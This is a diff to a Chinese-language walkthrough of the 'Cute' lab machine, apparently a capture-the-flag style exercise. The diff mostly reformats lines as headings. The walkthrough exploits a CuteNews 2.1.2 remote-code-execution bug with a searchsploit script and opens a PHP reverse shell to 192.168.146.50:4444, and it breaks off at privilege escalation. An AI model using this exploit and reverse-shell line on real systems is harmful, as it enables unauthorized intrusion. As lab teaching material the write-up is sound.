@@ -98,22 +98,22 @@ Nmap done: 1 IP address (1 host up) scanned in 20.22 seconds
 ---------------------------------------------------------------------------
 + 1 host(s) tested
 ```
-发现存在index.php
+##### 发现存在index.php
 ![Img](../FILES/Cute.md/img-20220725114624.png)
-能注册用户
-进入注册界面
+##### 能注册用户
+##### 进入注册界面
 ![Img](../FILES/Cute.md/img-20220725114706.png)
-发现验证码找不出来
-打开源码查看一下本页面
+##### 发现验证码找不出来
+##### 打开源码查看一下本页面
 ![Img](../FILES/Cute.md/img-20220725114756.png)
-发现有个captcha.php
+##### 发现有个captcha.php
 ![Img](../FILES/Cute.md/img-20220725114807.png)
-打开之后发现验证码
-注册成功后登录
+##### 打开之后发现验证码
+##### 注册成功后登录
 ![Img](../FILES/Cute.md/img-20220725114835.png)
-发现底部的版本号为2.1.2, google搜一下
+##### 发现底部的版本号为2.1.2, google搜一下
 ![Img](../FILES/Cute.md/img-20220725114909.png)
- 发现本版本有RCE
+##### 发现本版本有RCE
 #### 漏洞利用
 ```
 └─$ searchsploit cutenews 2.1.2
@@ -127,8 +127,8 @@ CuteNews 2.1.2 - Remote Code Execution                                          
 ---------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 ```
-在exploit发现有现成的python脚本
-下载下来使用
+##### 在exploit发现有现成的python脚本
+##### 下载下来使用
 ```
 └─$ searchsploit -m php/webapps/48800.py
   Exploit: CuteNews 2.1.2 - Remote Code Execution
@@ -176,12 +176,12 @@ Registering a users
 └─$ 
 
 ```
-但是发现不存在此用户, 查看一下漏洞利用代码
+##### 但是发现不能执行, 查看一下漏洞利用代码
 ![Img](../FILES/Cute.md/img-20220725115151.png)
-发现我们没有这个目录, 把EXP里面所有的目录去掉试试
+##### 发现我们没有这个目录, 把EXP里面所有的目录去掉试试
 重新执行
 ![Img](../FILES/Cute.md/img-20220725115318.png)
-发现可以执行
+##### 发现可以执行
 ```
 command > whoami
 www-data
@@ -197,14 +197,14 @@ avatar_cruDW9A0zh_cruDW9A0zh.php
 avatar_rwRemM6TLd_message2.jpg
 index.html
 ```
-执行反弹shell
+##### 执行反弹shell
 ```
 php -r '$sock=fsockopen("192.168.146.50",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 ```
 
 ![Img](../FILES/Cute.md/img-20220725115522.png)
-拿到shell
+##### 拿到shell
 ### 提权
 #### 使用linpeas进行信息收集
 ```
